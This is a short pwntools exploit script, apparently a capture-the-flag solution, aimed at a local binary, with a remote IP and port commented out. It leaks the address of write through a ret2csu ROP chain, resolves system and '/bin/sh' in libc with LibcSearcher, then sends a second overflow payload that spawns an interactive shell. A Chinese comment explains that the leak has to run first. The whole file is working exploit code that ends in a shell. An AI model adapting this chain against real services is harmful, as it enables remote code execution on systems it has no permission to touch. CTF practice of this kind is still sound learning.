#encoding:utf-8
from pwn import *
from LibcSearcher import *
#p=remote('111.198.29.45',37921)
p = process('./1')
elf=ELF('./1')
obj=LibcSearcher("write",0x7f8aeec212b0)    #这个得先泄露write的地址，也就是先运行一次再加进来的。
pop4_addr=0x040089c
pop6_addr=0x040089a
mov_addr=0x0400880
prdi_addr=0x04008a3
write_plt=elf.symbols['write']
write_got=elf.got['write']
print p.recv(1024)
payload1='A'*24+p64(pop4_addr)+p64(pop6_addr)+p64(0)+p64(1)+p64(write_got)+p64(8)+p64(write_got)+p64(1)+p64(mov_addr)+'A'*56+p64(0x0400630)
payload1=payload1.ljust(1024,'C')
p.send(payload1)
write_addr=u64(p.recv(8))
print "---"+hex(write_addr)
offset=write_addr-obj.dump("write")
sys_addr=offset+obj.dump("system")
sh_addr=offset+obj.dump("str_bin_sh")
payload2='A'*24+p64(pop4_addr)+p64(prdi_addr)+p64(sh_addr)+p64(sys_addr)+p64(0x0400630)
payload2=payload2.ljust(1024,'C')
print p.recv(1024)
p.send(payload2)
sleep(1)
p.interactive()
